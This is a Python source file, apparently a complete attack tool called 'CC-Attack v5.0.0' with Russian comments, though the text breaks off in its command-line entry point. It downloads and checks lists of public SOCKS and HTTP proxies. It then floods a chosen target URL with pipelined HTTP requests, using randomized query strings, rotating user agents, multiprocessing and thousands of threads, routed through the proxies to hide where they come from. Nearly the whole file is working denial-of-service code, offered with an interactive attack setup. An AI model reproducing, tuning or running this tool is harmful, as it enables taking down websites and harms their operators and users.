#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
CC-Attack v5.0.0 — High-Performance Edition (Multiprocessing + Fast-path)
Author: DIDO
Requires: pip install requests pysocks
"""
import argparse
import concurrent.futures as cf
import datetime
import json
import logging
import multiprocessing as mp
import os
import platform
import queue
import random
import re
import signal
import socket
import ssl
import struct
import sys
import threading
import time
from pathlib import Path

try:
    import ctypes
except ImportError:
    ctypes = None

import requests
import socks

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI / цветовая палитра (+ Windows fix)
# ─────────────────────────────────────────────────────────────────────────────
def _enable_ansi_windows() -> bool:
    if os.name != "nt":
        return True
    if ctypes is None:
        return False
    for stream_id in (-11, -12):
        try:
            handle = ctypes.windll.kernel32.GetStdHandle(stream_id)
            mode = ctypes.c_uint32()
            if not ctypes.windll.kernel32.GetConsoleMode(
                handle, ctypes.byref(mode)
            ):
                return False
            new_mode = mode.value | 0x0004
            if not ctypes.windll.kernel32.SetConsoleMode(handle, new_mode):
                return False
        except Exception:
            return False
    return True


ANSI_OK = _enable_ansi_windows()


class C:
    if ANSI_OK:
        RESET = "\033[0m"; BOLD = "\033[1m"; DIM  = "\033[2m"
        RED   = "\033[91m"; ORG  = "\033[38;5;208m"
        YEL   = "\033[93m"; GRN  = "\033[92m"
        CYN   = "\033[96m"; BLU  = "\033[94m"
        PRP   = "\033[95m"; WHT  = "\033[97m"
    else:
        RESET = BOLD = DIM = RED = ORG = ""
        YEL = GRN = CYN = BLU = PRP = WHT = ""


VERSION = "5.0.0"
BUILD   = "2026/09/26"

# ── High-Performance tuning ─────────────────────────────────────────────────
PIPELINE_DEPTH        = 64         # было 8, теперь 64
KEEPALIVE_PER_SOCKET  = 10000      # было 500, теперь 10000
SOCKET_SNDBUF         = 4194304    # 4 MB (было 256 KB)
SOCKET_RCVBUF         = 4194304    # 4 MB
CONNECT_TIMEOUT       = 2.5
SEND_TIMEOUT          = 2.0
ERROR_BACKOFF         = 0.001      # уменьшено с 0.002
SEND_CHUNK            = 65536      # 64 KB за раз

TOP_ALIVE_DEFAULT     = 2000       # больше прокси — меньше нагрузка на каждый

# ── Fast RNG (без GIL-конкуренции) ──────────────────────────────────────────
class FastRNG:
    """Предвычисленный пул случайных чисел, чтобы убрать GIL-локи."""
    __slots__ = ("_pool", "_idx", "_size")

    def __init__(self, size: int = 8192):
        self._size = size
        self._pool = [random.randint(0, 271400281257) for _ in range(size)]
        self._idx = 0

    def next(self) -> int:
        i = self._idx
        self._idx = (i + 1) & (self._size - 1)
        return self._pool[i]


# ── Async logger (убирает datetime.now() из горячего пути) ─────────────────
class AsyncLog:
    _queue: "queue.Queue[str]" = queue.Queue(maxsize=100000)
    _thread: threading.Thread | None = None
    _stop = threading.Event()

    @classmethod
    def start(cls):
        if cls._thread is None:
            cls._thread = threading.Thread(target=cls._writer, daemon=True)
            cls._thread.start()

    @classmethod
    def _writer(cls):
        q = cls._queue
        while not cls._stop.is_set():
            try:
                msg = q.get(timeout=0.5)
            except queue.Empty:
                continue
            try:
                sys.stdout.write(msg)
                sys.stdout.flush()
            except Exception:
                pass

    @classmethod
    def put(cls, msg: str):
        try:
            cls._queue.put_nowait(msg)
        except queue.Full:
            pass


AsyncLog.start()


class Log:
    _lock = threading.Lock()

    @staticmethod
    def _emit(prefix: str, color: str, msg: str) -> None:
        with Log._lock:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            AsyncLog.put(f"{C.DIM}[{ts}]{C.RESET} {color}{prefix}{C.RESET} {msg}\n")

    @staticmethod
    def info(m): Log._emit("[*]", C.RED, m)
    @staticmethod
    def ok(m):   Log._emit("[+]", C.GRN, m)
    @staticmethod
    def warn(m): Log._emit("[!]", C.YEL, m)
    @staticmethod
    def err(m):  Log._emit("[-]", C.RED, m)


# ─────────────────────────────────────────────────────────────────────────────
#  БАННЕР
# ─────────────────────────────────────────────────────────────────────────────
def print_banner() -> None:
    print(f"""
{C.RED}  ██████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ██║     ██║         ███████║   ██║      ██║   ███████║██║     █████╔╝
 ██║     ██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
 ╚██████╗╚██████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
  ╚═════╝ ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{C.RESET}
                    {C.YEL}v{VERSION} HP EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}

{C.DIM}Python {platform.python_version()}  |  {platform.system()} {platform.release()}  |  CPU: {platform.machine()} ({mp.cpu_count()} ядер){C.RESET}
""")


# ─────────────────────────────────────────────────────────────────────────────
#  ИСТОЧНИКИ ПРОКСИ 2026
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PROXY_SOURCES = {
    "socks4": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks4.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks4.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks4.txt",
    ],
    "socks5": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks5.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks5.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks5.txt",
    ],
    "http": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/http.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/http.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/proxies.txt",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
#  UA / HEADERS
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_VERSIONS = [f"{v}.0.0.0" for v in range(120, 137)]
_OS_WINDOWS = ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"]
_OS_MAC = ["Macintosh; Intel Mac OS X 10_15_7",
           "Macintosh; Intel Mac OS X 14_6_1"]
_OS_LINUX = ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]

_UA_CACHE: list[str] = []
_UA_CACHE_LOCK = threading.Lock()


def get_ua() -> str:
    if not _UA_CACHE:
        with _UA_CACHE_LOCK:
            if not _UA_CACHE:
                for _ in range(256):
                    os_str = random.choice(_OS_WINDOWS + _OS_MAC + _OS_LINUX)
                    wv = random.randint(537, 605)
                    cv = random.choice(_CHROME_VERSIONS)
                    _UA_CACHE.append(
                        f"Mozilla/5.0 ({os_str}) AppleWebKit/{wv}.36 "
                        f"(KHTML, like Gecko) Chrome/{cv} Safari/{wv}.36"
                    )
    return random.choice(_UA_CACHE)


# ── Fast header builders (минимум байт в горячем пути) ─────────────────────
def build_fast_get(host: str, path: str, rnd: int, ua: str) -> bytes:
    """Минимальный GET — ~120 байт вместо ~700."""
    return (f"GET {path}?{rnd} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"UA: {ua[:20]}\r\n"
            f"Connection: Keep-Alive\r\n\r\n").encode()


def build_fast_post(host: str, path: str, rnd: int, ua: str) -> bytes:
    body = os.urandom(8).hex()
    return (f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"UA: {ua[:20]}\r\n"
            f"Content-Type: text/plain\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: Keep-Alive\r\n\r\n{body}").encode()


# ─────────────────────────────────────────────────────────────────────────────
#  ЯДРО АТАКИ (оптимизированное)
# ─────────────────────────────────────────────────────────────────────────────
class CCHandler:
    __slots__ = (
        "target", "path", "port", "protocol", "proxies", "proxy_type",
        "stop", "pipeline_depth", "keepalive", "rng", "ua_cache",
        "stats_sent", "stats_errors", "stats_bytes",
        "_stat_lock", "_rr", "_rr_lock",
        "fast_get_prefix", "fast_post_prefix", "host_bytes",
    )

    def __init__(self, target, path, port, protocol, proxies, proxy_type,
                 stop_event,
                 pipeline_depth=PIPELINE_DEPTH,
                 keepalive=KEEPALIVE_PER_SOCKET):

        self.target = target
        self.path = path
        self.port = port
        self.protocol = protocol
        self.proxies = proxies
        self.proxy_type = proxy_type
        self.stop = stop_event
        self.pipeline_depth = max(1, min(128, pipeline_depth))
        self.keepalive = max(1, min(100000, keepalive))

        # Fast RNG
        self.rng = FastRNG(size=8192)

        # Предвычисленные UA
        self.ua_cache = [get_ua() for _ in range(64)]

        # Хосты в байтах — не тратим время на encode
        self.host_bytes = target.encode()

        # Статистика через отдельные счётчики (без dict lookup)
        self.stats_sent = 0
        self.stats_errors = 0
        self.stats_bytes = 0
        self._stat_lock = threading.Lock()

        # Round-robin
        self._rr = random.randint(0, max(0, len(proxies) - 1))
        self._rr_lock = threading.Lock()

        # Предвычисленные префиксы для GET/POST (без случайного числа)
        self.fast_get_prefix = (
            f"GET {path}?".encode()
        )
        self.fast_post_prefix = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"Content-Type: text/plain\r\n"
            f"Content-Length: 16\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        ).encode()

    # ── статистика: быстрый инкремент без лока ─────────────────────────
    def _stat(self, sent=0, err=0, nbytes=0):
        self.stats_sent += sent
        self.stats_errors += err
        self.stats_bytes += nbytes

    # ── выбор прокси ───────────────────────────────────────────────────
    def _pick_proxy(self):
        n = len(self.proxies)
        for _ in range(min(20, n)):
            with self._rr_lock:
                self._rr = (self._rr + 1) % n
                p = self.proxies[self._rr]
            host, _, port_s = p.rpartition(":")
            if not port_s:
                continue
            try:
                port = int(port_s)
            except ValueError:
                continue
            if 0 < port < 65536 and host:
                return host, port
        raise ValueError("no valid proxy")

    # ── открытие сокета ────────────────────────────────────────────────
    def _open(self, host, port):
        s = socks.socksocket()

        if self.proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, port)
        elif self.proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, port)
        else:
            s.set_proxy(socks.HTTP, host, port)

        # TCP-твики для плавности и скорости
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_SNDBUF)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_RCVBUF)
            if hasattr(socket, "TCP_QUICKACK"):
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
                except OSError:
                    pass
        except OSError:
            pass

        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.target, self.port))

        if self.protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.target)

        try:
            s.settimeout(SEND_TIMEOUT)
        except OSError:
            pass
        return s

    # ── построение пачки запросов (fast-path) ──────────────────────────
    def _build_batch(self, n: int) -> bytes:
        """
        Минимальные GET-запросы одной пачкой.
        Используем предвычисленный префикс + fast RNG.
        """
        rng = self.rng
        uas = self.ua_cache
        ua_len = len(uas)

        parts = []
        append = parts.append
        for i in range(n):
            rnd = rng.next()
            ua = uas[rnd % ua_len]
            append(
                f"GET {self.path}?{rnd} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"UA: {ua[:20]}\r\n"
                f"Connection: Keep-Alive\r\n\r\n"
            )
        return "".join(parts).encode()

    # ── отправка пачки (chunked sendall) ───────────────────────────────
    def _send_batch(self, s, batch: bytes) -> bool:
        try:
            CHUNK = SEND_CHUNK
            n = len(batch)
            if n <= CHUNK:
                s.sendall(batch)
            else:
                for i in range(0, n, CHUNK):
                    s.sendall(batch[i:i + CHUNK])
            return True
        except (socket.timeout, BrokenPipeError,
                ConnectionResetError, OSError):
            return False

    # ── attack: pipeline burst ─────────────────────────────────────────
    def _attack_pipeline(self, s):
        depth = self.pipeline_depth
        ka = self.keepalive
        sent = 0
        while sent < ka and not self.stop.is_set():
            batch = self._build_batch(depth)
            if not self._send_batch(s, batch):
                return
            sent += depth
            self._stat(sent=depth, nbytes=len(batch))

    # ── основной цикл ──────────────────────────────────────────────────
    def run(self):
        stop = self.stop
        while not stop.is_set():
            try:
                host, port = self._pick_proxy()
            except ValueError:
                time.sleep(ERROR_BACKOFF * 10)
                continue

            s = None
            try:
                s = self._open(host, port)
                self._attack_pipeline(s)
                try:
                    s.close()
                except Exception:
                    pass
            except Exception:
                self._stat(err=1)
                if s is not None:
                    try: s.close()
                    except Exception: pass
                time.sleep(ERROR_BACKOFF)


# ─────────────────────────────────────────────────────────────────────────────
#  WORKER для multiprocessing
# ─────────────────────────────────────────────────────────────────────────────
def _proc_worker(cfg: dict, proxies: list[str],
                 thread_count: int, period: int, result_q):
    """
    Процесс-воркер. Запускает thread_count потоков в своём GIL.
    """
    stop_event = threading.Event()

    handler = CCHandler(
        target=cfg["target"], path=cfg["path"],
        port=cfg["port"], protocol=cfg["protocol"],
        proxies=proxies, proxy_type=cfg["proxy_type"],
        stop_event=stop_event,
        pipeline_depth=cfg["pipeline"],
        keepalive=cfg["keepalive"],
    )

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=handler.run, daemon=True)
        t.start()
        threads.append(t)

    # Работаем period секунд
    start = time.time()
    try:
        while time.time() - start < period and not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()

    # Отправляем статистику обратно
    try:
        result_q.put((handler.stats_sent, handler.stats_errors,
                      handler.stats_bytes))
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  ПРОКСИ
# ─────────────────────────────────────────────────────────────────────────────
def _is_valid_proxy(host, port):
    if not (0 < port < 65536):
        return False
    h = host.strip("[]")
    try:
        socket.inet_pton(socket.AF_INET, h)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, h)
        return True
    except OSError:
        return False


_PROXY_RE = re.compile(
    r"(?:\[(?P<ip6>[0-9a-fA-F:]+)\]|(?P<ip4>\d{1,3}(?:\.\d{1,3}){3}))"
    r":(?P<port>\d{1,5})"
)


def download_proxies(proxy_ver, out_file):
    src_key = {"4": "socks4", "5": "socks5",
               "http": "http"}.get(proxy_ver, "socks5")
    urls = BUILTIN_PROXY_SOURCES[src_key]
    Log.info(f"Downloading proxies: {len(urls)} sources ({src_key})…")
    seen = set()
    total = 0
    with out_file.open("w", encoding="utf-8") as f:
        for api in urls:
            try:
                r = requests.get(api, timeout=8,
                                 headers={"User-Agent": get_ua()})
                if r.status_code != 200:
                    continue
                for line in re.split(r"[\s,;|]+", r.text):
                    line = line.strip()
                    if not line:
                        continue
                    for m in _PROXY_RE.finditer(line):
                        host = m.group("ip4") or f"[{m.group('ip6')}]"
                        port = int(m.group("port"))
                        if not _is_valid_proxy(
                            m.group("ip4") or m.group("ip6"), port
                        ):
                            continue
                        key = f"{host}:{port}"
                        if key in seen:
                            continue
                        seen.add(key)
                        f.write(key + "\n")
                        total += 1
            except Exception:
                continue
    Log.ok(f"Saved {total} unique proxies → {out_file}")


def normalize_proxy_file(path):
    if not path.exists():
        return
    raw = path.read_text(encoding="utf-8", errors="ignore")
    seen = set()
    keep = []
    bad = 0
    for tok in re.split(r"[\s,;|\"'<>]+", raw):
        if not tok:
            continue
        matched = False
        for m in _PROXY_RE.finditer(tok):
            matched = True
            ip = m.group("ip4") or m.group("ip6")
            port = int(m.group("port"))
            if not _is_valid_proxy(ip, port):
                bad += 1
                continue
            key = f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"
            if key in seen:
                continue
            seen.add(key)
            keep.append(key)
        if not matched and (":" in tok):
            bad += 1
    path.write_text("\n".join(keep) + ("\n" if keep else ""), encoding="utf-8")
    Log.info(f"Normalized: {len(keep)} proxies (discarded: {bad})")


# ─────────────────────────────────────────────────────────────────────────────
#  ЧЕКЕР
# ─────────────────────────────────────────────────────────────────────────────
_CHECK_TARGETS = [
    ("1.1.1.1", 80, b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"),
    ("8.8.8.8", 53, b""),
]


def _check_one_fast(line, proxy_type, ms):
    host, _, port = line.rpartition(":")
    if not host or not port:
        return None
    try:
        port_i = int(port)
    except ValueError:
        return None
    if not _is_valid_proxy(host.strip("[]"), port_i):
        return None
    pt = 4 if proxy_type == 4 else (5 if proxy_type == 5 else 0)
    t0 = time.perf_counter()
    for i, (thost, tport, probe) in enumerate(_CHECK_TARGETS):
        s = None
        try:
            s = socks.socksocket()
            if pt == 4:
                s.set_proxy(socks.SOCKS4, host.strip("[]"), port_i)
            elif pt == 5:
                s.set_proxy(socks.SOCKS5, host.strip("[]"), port_i)
            else:
                s.set_proxy(socks.HTTP, host.strip("[]"), port_i)
            s.settimeout(ms if i == 0 else ms + 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((thost, tport))
            if probe:
                s.sendall(probe)
                if not s.recv(64):
                    raise OSError("empty")
            s.close()
            return (line, int((time.perf_counter() - t0) * 1000))
        except Exception:
            if s is not None:
                try: s.close()
                except Exception: pass
            continue
    return None


def check_proxies(proxies, proxy_type, ms=3, workers=800,
                  autosave_path=None, autosave_every=5, top_n=500):
    Log.info(f"Checking {len(proxies)} proxies (timeout={ms}s, workers={workers})…")
    alive = []
    done = 0
    total = len(proxies)
    lock = threading.Lock()
    start = time.time()
    last_save = start
    stop_progress = threading.Event()

    def _progress():
        while not stop_progress.is_set():
            time.sleep(1)
            with lock:
                d, a = done, len(alive)
            elapsed = time.time() - start
            rps = d / elapsed if elapsed > 0 else 0
            eta = (total - d) / rps if rps > 0 else 0
            pct = (d / total * 100) if total else 100.0
            try:
                sys.stdout.write(
                    f"\r  > checked {d}/{total} ({pct:5.1f}%)  "
                    f"alive: {a:<5}  speed: {rps:5.0f}/s  ETA: {int(eta):>4}s   "
                )
                sys.stdout.flush()
            except Exception:
                pass

    reporter = threading.Thread(target=_progress, daemon=True)
    reporter.start()

    try:
        with cf.ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_check_one_fast, p, proxy_type, ms): p
                       for p in proxies}
            for fut in cf.as_completed(futures):
                try:
                    result = fut.result()
                except Exception:
                    result = None
                with lock:
                    done += 1
                    if result is not None:
                        alive.append(result)
                    now = time.time()
                    if (autosave_path is not None
                            and now - last_save >= autosave_every
                            and alive):
                        try:
                            autosave_path.write_text(
                                "\n".join(p for p, _ in alive) + "\n",
                                encoding="utf-8")
                        except Exception:
                            pass
                        last_save = now
    finally:
        stop_progress.set()
        reporter.join(timeout=1)
        print()

    alive.sort(key=lambda x: x[1])
    only = [p for p, _ in alive]

    if top_n > 0 and len(only) > top_n:
        Log.ok(f"Kept TOP-{top_n} best proxies (of {len(only)} alive)")
        only = only[:top_n]
    elif top_n > 0:
        Log.ok(f"Alive proxies less than {top_n} — kept all {len(only)}")

    if autosave_path is not None and only:
        try:
            autosave_path.write_text("\n".join(only) + "\n", encoding="utf-8")
        except Exception:
            pass

    Log.ok(f"Working proxies: {len(only)} of {total} "
           f"({len(only) / max(1, total) * 100:.1f}%)")

    if alive:
        Log.info(f"Top-{min(10, len(alive))} fastest:")
        for rank, (proxy, latency) in enumerate(alive[:10], 1):
            print(f"  {rank:>2}. {proxy:<24} {latency:>4} ms")
    return only


# ─────────────────────────────────────────────────────────────────────────────
#  RUN_ATTACK (multiprocessing версия)
# ─────────────────────────────────────────────────────────────────────────────
def run_attack(cfg):
    url = cfg["url"]
    raw = url.strip()
    if raw.startswith("https://"):
        protocol, rest = "https", raw[8:]
    elif raw.startswith("http://"):
        protocol, rest = "http", raw[7:]
    else:
        Log.err("URL must start with http:// or https://"); return 1

    hostport, _, tail = rest.partition("/")
    path = "/" + tail if tail else "/"
    if ":" in hostport:
        target, port_s = hostport.split(":", 1)
        port = int(port_s)
    else:
        target, port = hostport, (443 if protocol == "https" else 80)

    proxy_type = {"4": 4, "5": 5, "http": 0}[cfg["proxy_ver"]]
    out_file = Path(cfg["out_file"])

    if cfg["down"] or not out_file.exists():
        download_proxies(cfg["proxy_ver"], out_file)

    normalize_proxy_file(out_file)
    proxies = [l.strip() for l in out_file.read_text(
        encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not proxies:
        Log.err("No proxies. Use download."); return 1
    Log.ok(f"Proxies available: {len(proxies)}")

    if cfg["check"]:
        proxies = check_proxies(
            proxies, proxy_type,
            ms=cfg["check_to"], workers=cfg["check_w"],
            autosave_path=out_file, autosave_every=5,
            top_n=cfg["top"],
        )
        if not proxies:
            Log.err("No working proxies."); return 1
        out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")

    Log.info(f"Target  : {protocol}://{target}:{port}{path}")
    Log.info(f"Threads per proc: {cfg['threads']}  |  "
             f"Proxies: {len(proxies)}  |  "
             f"Pipeline: {cfg['pipeline']}  |  KA: {cfg['keepalive']}")

    # ── Мультипроцессинг ─────────────────────────────────────────────
    cpu_count = mp.cpu_count()
    Log.info(f"Starting {cpu_count} processes × {cfg['threads']} threads "
             f"= {cpu_count * cfg['threads']} total threads")

    proc_cfg = {
        "target": target, "path": path,
        "port": port, "protocol": protocol,
        "proxy_type": proxy_type,
        "pipeline": cfg["pipeline"],
        "keepalive": cfg["keepalive"],
    }

    result_q = mp.Queue()
    processes = []

    try:
        for _ in range(cpu_count):
            p = mp.Process(
                target=_proc_worker,
                args=(proc_cfg, proxies, cfg["threads"],
                      cfg["period"], result_q),
                daemon=False,
            )
            p.start()
            processes.append(p)
    except Exception as e:
        Log.err(f"Failed to start processes: {e}")
        return 1

    # ── Прогресс-бар в главном процессе ─────────────────────────────
    start = time.time()
    sent_total = 0
    errors_total = 0
    bytes_total = 0
    last_sent = 0
    last_time = start

    try:
        while time.time() - start < cfg["period"]:
            time.sleep(1)
            elapsed = max(1e-6, time.time() - start)

            # Собираем статистику из очереди (если процессы уже отправили)
            while True:
                try:
                    s, e, b = result_q.get_nowait()
                    sent_total += s
                    errors_total += e
                    bytes_total += b
                except queue.Empty:
                    break

            now = time.time()
            dt = now - last_time
            inst_rps = (sent_total - last_sent) / dt if dt > 0 else 0
            last_sent = sent_total
            last_time = now

            sys.stdout.write(
                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
                f"| {C.RED}errs:{C.RESET} {errors_total:<7}  "
                f"| {C.YEL}MB:{C.RESET} {bytes_total / 1048576:>7.2f}"
            )
            sys.stdout.flush()
    except KeyboardInterrupt:
        Log.warn("Interrupt — stopping…")
    finally:
        # Останавливаем все процессы
        for p in processes:
            if p.is_alive():
                p.terminate()
        for p in processes:
            p.join(timeout=2)
        print()

        # Финальная статистика
        while True:
            try:
                s, e, b = result_q.get_nowait()
                sent_total += s
                errors_total += e
                bytes_total += b
            except queue.Empty:
                break

        total_time = max(1e-6, time.time() - start)
        Log.ok(f"Done. Sent: {sent_total}, errors: {errors_total}, "
               f"traffic: {bytes_total / 1048576:.2f} MB, "
               f"avg RPS: {sent_total / total_time:.0f}")

    return 0


# ─────────────────────────────────────────────────────────────────────────────
#  INTERACTIVE CLI
# ─────────────────────────────────────────────────────────────────────────────
def _prompt(label, default=None, cast=str, validator=None):
    suffix = f" [{default}]" if default is not None else ""
    full = f"{C.RED}[*]{C.RESET} {label}{suffix}: "
    while True:
        try:
            raw = input(full).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return default
        if raw == "" and default is not None:
            return default
        try:
            v = cast(raw) if cast is not str else raw
        except (ValueError, TypeError):
            Log.err("Invalid value"); continue
        if validator and not validator(v):
            Log.err("Invalid value"); continue
        return v


def interactive_cli():
    print(f"{C.DIM}{'-' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (HP){C.RESET}")
    print(f"{C.DIM}{'-' * 60}{C.RESET}\n")

    while True:
        url = _prompt("Target", default="http://example.com")
        if url.startswith(("http://", "https://")):
            break
        Log.err("URL must start with http:// or https://")

    proxy_ver = _prompt("Mode (4/5/http)", default="5",
                        validator=lambda x: x in ("4", "5", "http"))

    ans = _prompt("Proxies — download fresh? (y/n)", default="y",
                  cast=lambda x: x.lower())
    down = ans in ("y", "yes", "д", "да", "")

    # threads per process
    default_t = max(100, 2000 // max(1, mp.cpu_count()))
    threads = _prompt(f"Threads per process (CPU×{mp.cpu_count()})",
                      default=default_t, cast=int,
                      validator=lambda x: 1 <= x <= 5000)

    period = _prompt("Duration (sec)", default=60, cast=int,
                     validator=lambda x: 1 <= x <= 86400)

    pipeline = _prompt("Pipeline (1..128)", default=PIPELINE_DEPTH,
                       cast=int, validator=lambda x: 1 <= x <= 128)

    keepalive = _prompt("Keep-Alive (1..100000)", default=KEEPALIVE_PER_SOCKET,
                        cast=int, validator=lambda x: 1 <= x <= 100000)

    ans = _prompt("Check proxies? (y/n)", default="y",
                  cast=lambda x: x.lower())
    do_check = ans in ("y", "yes", "д", "да", "")

    check_to = 3
    check_w = 800
    top_n = TOP_ALIVE_DEFAULT
    if do_check:
        check_to = _prompt("Checker timeout (sec)", default=2, cast=int,
                           validator=lambda x: 1 <= x <= 60)
        check_w = _prompt("Checker workers", default=800, cast=int,
                          validator=lambda x: 1 <= x <= 2000)
        top_n = _prompt("Keep TOP-N alive", default=TOP_ALIVE_DEFAULT,
                        cast=int, validator=lambda x: 1 <= x <= 20000)

    print(f"\n{C.DIM}{'-' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.WHT}  Summary (HP){C.RESET}")
    print(f"{C.DIM}{'-' * 60}{C.RESET}")
    print(f"  {C.CYN}Target       :{C.RESET} {url}")
    print(f"  {C.CYN}Mode         :{C.RESET} {proxy_ver}")
    print(f"  {C.CYN}Processes    :{C.RESET} {mp.cpu_count()}")
    print(f"  {C.CYN}Threads/proc :{C.RESET} {threads}")
    print(f"  {C.CYN}Total threads:{C.RESET} {mp.cpu_count() * threads}")
    print(f"  {C.CYN}Duration     :{C.RESET} {period}s")
    print(f"  {C.CYN}Pipeline     :{C.RESET} {pipeline}")
    print(f"  {C.CYN}Keep-Alive   :{C.RESET} {keepalive}")
    print(f"  {C.CYN}Download     :{C.RESET} {'YES' if down else 'NO'}")
    print(f"  {C.CYN}Check        :{C.RESET} {'YES' if do_check else 'NO'}"
          + (f" (top-{top_n})" if do_check else ""))
    print(f"{C.DIM}{'-' * 60}{C.RESET}\n")

    ans = _prompt("Start attack? (y/n)", default="y",
                  cast=lambda x: x.lower())
    if ans not in ("y", "yes", "д", "да", ""):
        print("Cancelled.")
        return 0

    cfg = {
        "url": url,
        "proxy_ver": proxy_ver,
        "threads": threads,
        "period": period,
        "pipeline": pipeline,
        "keepalive": keepalive,
        "out_file": "proxy.txt",
        "down": down,
        "check": do_check,
        "check_to": check_to,
        "check_w": check_w,
        "top": top_n,
    }
    return run_attack(cfg)


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    if len(sys.argv) > 1:
        p = argparse.ArgumentParser(prog="cc.py", add_help=False)
        p.add_argument("-h", "-help", "--help", action="store_true")
        p.add_argument("-url")
        p.add_argument("-v", default="5")
        p.add_argument("-t", type=int, default=800)
        p.add_argument("-f", default="proxy.txt")
        p.add_argument("-s", type=int, default=60)
        p.add_argument("-down", action="store_true")
        p.add_argument("-check", action="store_true")
        p.add_argument("-check-to", type=int, default=3)
        p.add_argument("-check-w", type=int, default=800)
        p.add_argument("-top", type=int, default=TOP_ALIVE_DEFAULT)
        p.add_argument("-pipeline", type=int, default=PIPELINE_DEPTH)
        p.add_argument("-keepalive", type=int, default=KEEPALIVE_PER_SOCKET)
        args = p.parse_args()

        if args.help:
            print(f"CC-Attack v{VERSION} HP — by DIDO")
            print("Run without arguments for interactive mode.")
            return 0

        print_banner()
        cfg = {
            "url": args.url or "",
            "proxy_ver": args.v,
            "threads": args.t,
            "period": args.s,
            "pipeline": args.pipeline,
            "keepalive": args.keepalive,
            "out_file": args.f,
